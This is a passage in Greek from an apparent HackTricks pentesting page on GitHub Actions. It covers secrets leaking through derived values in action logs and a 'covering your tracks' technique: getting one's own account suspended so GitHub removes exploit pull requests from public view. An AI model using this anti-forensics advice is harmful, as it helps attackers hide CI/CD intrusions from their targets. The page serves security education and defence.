Ακόμα κι αν το **Github** προσπαθεί να **detect secret values** στα actions logs και να **avoid showing** αυτά, **άλλα ευαίσθητα δεδομένα** που μπορεί να έχουν παραχθεί κατά την εκτέλεση του action δεν θα αποκρυφθούν. Για παράδειγμα, ένα JWT υπογεγραμμένο με μια secret value δεν θα αποκρυφθεί εκτός αν είναι [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Καλύπτοντας τα ίχνη σας

(Τεχνική από [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Πρώτον, κάθε PR που ανοίγει είναι ξεκάθαρα ορατό στο κοινό στο Github και στον στόχο του GitHub account. Στο GitHub από προεπιλογή, **δεν μπορούμε να διαγράψουμε ένα PR από το internet**, αλλά υπάρχει μια παράμετρος. Για Github accounts που είναι **suspended** από το Github, όλα τα **PRs διαγράφονται αυτόματα** και αφαιρούνται από το internet. Έτσι, για να κρύψετε τη δραστηριότητά σας πρέπει είτε να κάνετε suspend το **GitHub account** σας είτε να κάνετε flag τον λογαριασμό σας. Αυτό θα **κρύψει όλες τις δραστηριότητές σας** στο GitHub από το internet (βασικά θα αφαιρέσει όλα τα exploit PR σας)

Μια οργάνωση στο GitHub είναι πολύ προδραστική στην αναφορά λογαριασμών στο GitHub. Το μόνο που χρειάζεται είναι να μοιραστείτε “some stuff” σε ένα Issue και θα φροντίσουν ώστε ο λογαριασμός σας να είναι suspended σε 12 ώρες :p και εκεί το έχετε, κάνατε το exploit σας αόρατο στο github.

> [!WARNING]
> Ο μοναδικός τρόπος για μια οργάνωση να ανακαλύψει ότι έχει στοχευτεί είναι να ελέγξει τα GitHub logs από SIEM αφού από το GitHub UI το PR θα έχει αφαιρεθεί.

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
